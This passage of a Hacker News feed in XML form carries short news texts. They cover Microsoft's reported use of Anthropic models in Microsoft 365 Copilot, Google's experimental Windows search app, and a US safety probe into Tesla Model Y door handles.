    &lt;p&gt;Microsoft is also reportedly planning to use Anthropic’s AI models for some features in its Microsoft 365 apps soon. The Information reports that the Microsoft 365 Copilot will be “partly powered by Anthropic models,” after Microsoft found that some of these models outperformed OpenAI in Excel and PowerPoint.&lt;/p&gt;
    &lt;p&gt;OpenAI and Microsoft announced a new deal last week that could clear the way for the AI startup’s initial public offering. Microsoft has invested more than $13 billion in OpenAI since 2019, and has a complex revenue sharing agreement in place. Microsoft now allows OpenAI to lean on rival cloud providers, and is expected to reveal further details about the “next phase” of its OpenAI relationship soon.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://www.theverge.com/report/778641/microsoft-visual-studio-code-anthropic-claude-4"/><published>2025-09-16T14:48:37+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=45263230</id><title>The old SF tech scene is dead. What it's morphing into is more sinister</title><updated>2025-09-16T16:11:52.091393+00:00</updated><content/><link href="https://www.sfgate.com/tech/article/bay-area-tech-scene-dorky-now-terrifying-21042943.php"/><published>2025-09-16T15:00:06+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=45263317</id><title>We're launching a new Google app for Windows experiment in Labs</title><updated>2025-09-16T16:11:51.832798+00:00</updated><content>&lt;doc fingerprint="59ea9b23e3b72fc2"&gt;
  &lt;main&gt;
    &lt;p&gt;Today, we’re launching a new experimental Google app for Windows in Labs to help you find what you need, faster.&lt;/p&gt;
    &lt;p&gt;Now you can search without switching windows or interrupting your flow. Whether you're writing in a doc or in the middle of a game, just press Alt + Space to instantly search for information from your computer files, installed apps, Google Drive files — and of course, the web.&lt;/p&gt;
    &lt;p&gt;With Google Lens built in, you can select and search anything on your screen, making it easy to translate images or text, get help with homework problems and more. You can also get deeper AI-powered responses in AI Mode and keep exploring with follow-up questions and helpful links.&lt;/p&gt;
    &lt;p&gt;Try it for yourself by opting into the experiment in Labs.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://blog.google/products/search/google-app-windows-labs/"/><published>2025-09-16T15:05:46+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=45263785</id><title>Tesla Faces US Auto Safety Investigation over Door Handles</title><updated>2025-09-16T16:11:51.694727+00:00</updated><content>&lt;doc fingerprint="9e9cf5ca9c7fe48"&gt;
  &lt;main&gt;
    &lt;p&gt;Transportation&lt;/p&gt;
    &lt;head rend="h1"&gt;Tesla Faces US Auto Safety Investigation Over Door Handles&lt;/head&gt;
    &lt;p&gt;US auto safety regulators opened an investigation into whether some Tesla Inc. vehicle doors are defective, citing incidents in which exterior handles stopped working and trapped children inside.&lt;/p&gt;
    &lt;p&gt;The National Highway Traffic Safety Administration said Tuesday it’s opening a preliminary evaluation of Tesla’s electrically powered door handles becoming inoperative due to issues with certain vehicles’ low-voltage batteries. While the probe specifically focuses on an estimated 174,290 Model Y SUVs, the regulator said the investigation could widen.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://www.bloomberg.com/news/articles/2025-09-16/tesla-tsla-faces-probe-by-us-auto-safety-agency-over-door-handles"/><published>2025-09-16T15:42:14+00:00</published></entry></feed>